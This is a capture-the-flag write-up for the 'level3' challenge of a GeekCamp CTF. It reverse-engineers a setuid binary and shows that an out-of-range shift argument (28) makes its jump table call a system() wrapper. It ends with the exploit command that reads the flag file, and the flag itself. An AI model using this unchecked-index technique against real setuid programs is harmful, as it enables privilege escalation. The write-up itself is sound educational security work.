# Level 3

`level3` is also a `setuid` binary.

```shell
> ls -l $(which level3) && file $(which level3)
```

```
-rwsr-sr-x 1 level3 users 7117 Oct 6 17:58 level3
level3: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
 dynamically linked (uses shared libs), for GNU/Linux 2.6.32,
 BuildID[sha1]=811f740b57c63b18158fe05bc5913de0bd03eec6, not stripped
```

---

Running it displays some usage information, with the binary claiming to run Caesar's cipher,
with variable shift parameters.

```shell
> level3
```

```
Linux ctf.geekcamp.sg 3.16.4-1-ARCH #1 SMP PREEMPT Mon Oct 6 08:22:27 CEST 2014 x86_64 GNU/Linux
Usage: level3 <rot_offset> <string>
Example:
 $ level3 13 foo
sbb
```

---

While the binary does run `uname`, it now contains the full path to the executable, circumventing
the issue with `level2`.

```shell
> strings $(which level3) | grep uname
```

```
/usr/bin/uname -a
```

---

Listing the functions reveals one function per shift parameter, which
is rather nonsensical. There is also a suspicious `run` function.

```shell
> gdb level3
(gdb) info functions
```

```
Non-debugging symbols:
[snipped]
0x0000000000400696  rotn
0x0000000000400735  rotm1
0x00000000004007a0  rot0
0x000000000040080b  rot1
0x0000000000400876  rot2
.
.
.
0x0000000000401213  rot25
0x000000000040127e  rot26
0x00000000004012e9  rot27
0x0000000000401354  run
0x000000000040136e  main
[snipped]
```

---

The disassembly of `run` gives us what seems to be a trivial wrapper around `system()`

```
   0x0000000000401354 <+0>:	push   %rbp
   0x0000000000401355 <+1>:	mov    %rsp,%rbp
   0x0000000000401358 <+4>:	sub    $0x10,%rsp
   0x000000000040135c <+8>:	mov    %rdi,-0x8(%rbp)
   0x0000000000401360 <+12>:	mov    -0x8(%rbp),%rax
   0x0000000000401364 <+16>:	mov    %rax,%rdi
   0x0000000000401367 <+19>:	callq  0x400550 <system@plt>
   0x000000000040136c <+24>:	leaveq 
   0x000000000040136d <+25>:	retq  
```

---

Disassembling `main` reveals that the `rot` functions are called using a jump table.

```asm
   0x000000000040136e <+0>:	push   %rbp
   0x000000000040136f <+1>:	mov    %rsp,%rbp
   0x0000000000401372 <+4>:	sub    $0x20,%rsp
   0x0000000000401376 <+8>:	mov    %edi,-0x14(%rbp)
   0x0000000000401379 <+11>:	mov    %rsi,-0x20(%rbp)
   0x000000000040137d <+15>:	mov    $0x401488,%edi
   0x0000000000401382 <+20>:	callq  0x401354 <run>
   0x0000000000401387 <+25>:	cmpl   $0x3,-0x14(%rbp)
   0x000000000040138b <+29>:	je     0x4013a8 <main+58>
   0x000000000040138d <+31>:	mov    $0x4014a0,%edi
   0x0000000000401392 <+36>:	callq  0x400530 <puts@plt>
   0x0000000000401397 <+41>:	mov    $0x4014c4,%edi
   0x000000000040139c <+46>:	callq  0x400530 <puts@plt>
   0x00000000004013a1 <+51>:	mov    $0x1,%eax
   0x00000000004013a6 <+56>:	jmp    0x4013f4 <main+134>
   0x00000000004013a8 <+58>:	mov    -0x20(%rbp),%rax
   0x00000000004013ac <+62>:	add    $0x8,%rax
   0x00000000004013b0 <+66>:	mov    (%rax),%rax
   0x00000000004013b3 <+69>:	mov    %rax,%rdi

; at this point, we presumably have an atoi()-ed version of the string
   0x00000000004013b6 <+72>:	callq  0x400580 <atoi@plt>
   0x00000000004013bb <+77>:	cltq   

; the following two addresses look suspiciously like the addresses of
; rot0 and rot1 above.
   0x00000000004013bd <+79>:	mov    $0x40080b,%ecx
   0x00000000004013c2 <+84>:	mov    $0x4007a0,%edx
   0x00000000004013c7 <+89>:	sub    %rdx,%rcx        ; rot1 - rot0 ?
   0x00000000004013ca <+92>:	mov    %rcx,%rdx
   0x00000000004013cd <+95>:	imul   %rdx,%rax        ; (rot1 - rot0) * something?

; again, we see what looks like the address of rot0
   0x00000000004013d1 <+99>:	add    $0x4007a0,%rax
   0x00000000004013d7 <+105>:	mov    %rax,-0x8(%rbp)
   0x00000000004013db <+109>:	mov    -0x20(%rbp),%rax
   0x00000000004013df <+113>:	add    $0x10,%rax
   0x00000000004013e3 <+117>:	mov    (%rax),%rdx
   0x00000000004013e6 <+120>:	mov    -0x8(%rbp),%rax
   0x00000000004013ea <+124>:	mov    %rdx,%rdi

; it seems we have a jump-table on our hands
   0x00000000004013ed <+127>:	callq  *%rax
   0x00000000004013ef <+129>:	mov    $0x0,%eax
   0x00000000004013f4 <+134>:	leaveq 
   0x00000000004013f5 <+135>:	retq  
```

---

All that needs to be done is to find the input that will cause the jump-table
code to execute `run` instead of one of the `rot`s.

With `rot0` @ `4007a0` and `rot1` @ `40080b`, the "distance" between functions is `6b`, or `107`.
The address of `run` is `401354`, which just happens to be `6b` higher than `rot27` @  `4012e9`.
`28` will, thus, execute `run`.

```shell
> level3 28 "cat /home/level3/flag
```

```
Linux ctf.geekcamp.sg 3.16.4-1-ARCH #1 SMP PREEMPT Mon Oct 6 08:22:27 CEST 2014 x86_64 GNU/Linux
quaawiechohfoosheewaichigaxaibieshoonael
```

\#win
